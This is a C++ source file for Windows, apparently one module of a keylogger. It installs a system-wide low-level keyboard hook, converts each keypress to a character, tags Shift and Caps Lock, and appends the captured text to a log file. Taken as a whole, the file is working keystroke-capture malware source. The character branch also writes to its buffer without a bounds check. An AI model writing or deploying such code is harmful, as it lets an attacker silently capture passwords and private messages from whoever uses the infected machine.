#include <windows.h>
#include "hook.h"
#include "config.h"
#include <cstdio>
#include <time.h>

HHOOK hHook = NULL;
time_t lastKeypressTime = 0;
static char buffer[MAX_BUFFER_LEN];
static int index = 0;


char getTypedChar(DWORD vkCode, DWORD scanCode) {
    BYTE keyboardState[256];
    WCHAR unicodeChar[5];

    if (!GetKeyboardState(keyboardState)) {
        return '\0';
    }

    int result = ToUnicode(
        vkCode,
        scanCode,
        keyboardState,
        unicodeChar,
        4,
        0
    );

    if (result > 0) {
        return (char)unicodeChar[0];
    }

    return '\0';
}

void flushBuffer()
{
    if (index == 0)
        return;

    // append mode
    FILE *file = fopen(LOG_FILE_PATH, "a+");
    if (file)
    {

        buffer[index] = '\0';
        fprintf(file, "%s\n", buffer);
        fclose(file);
    }
    index = 0;
}

/**
 * nCode: whether to process the message. != HC_ACTION means event shouldn't be processed. Pass along.
 * mParam: type of keyboard message
 * LPARAM: contains detailed info about the key event:
 */
LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{

    // Only record key pressed event
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = p->vkCode;

        time_t now = time(0);
        if (now - lastKeypressTime >= FLUSH_INTERVAL) {
            flushBuffer();
        }

        lastKeypressTime = now;

        if (vkCode == VK_RETURN)
        {
            flushBuffer();
        }
        else if (vkCode == VK_BACK && index > 0)
        {
            index--;
        }
        else if (vkCode == VK_SPACE && index < MAX_BUFFER_LEN - 1)
        {
            buffer[index++] = ' ';
        }
        else if (
            (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) &&
            index < MAX_BUFFER_LEN - 8)
        {
            const char* shiftStr = "[Shift]";
            for (int i = 0; shiftStr[i] != '\0'; i++) {
                buffer[index++] = shiftStr[i];
            }
        }
        else if (vkCode == VK_CAPITAL && index < MAX_BUFFER_LEN - 6)
        {
            const char *capsStr = "[CAPS]";
            for (int i = 0; capsStr[i] != '\0'; i++)
            {
                buffer[index++] = capsStr[i];
            }
        }
        else if (
            (vkCode >= 0x20 && vkCode <= 0x5A) || // space to Z
            (vkCode >= 0x60 && vkCode <= 0x6F) || // numpad 0-9 and ops
            (vkCode >= 0xBA && vkCode <= 0xDF)    // symbols and punctuation
        )
        {
            char typedChar = getTypedChar(vkCode, p->scanCode);
            buffer[index] = typedChar;
            index++;
        }
        else
        {
            // Ignore keys like function keys, control, alt, etc
        }

        if (index >= FLUSH_CHAR_THRESHOLD - 1) {
            flushBuffer();
        }
    }

    // Pass the hook to the next system.
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL installHook()
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, NULL, 0);
    return hHook != NULL;
}



void uninstallHook()
{
    if (hHook != NULL)
    {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}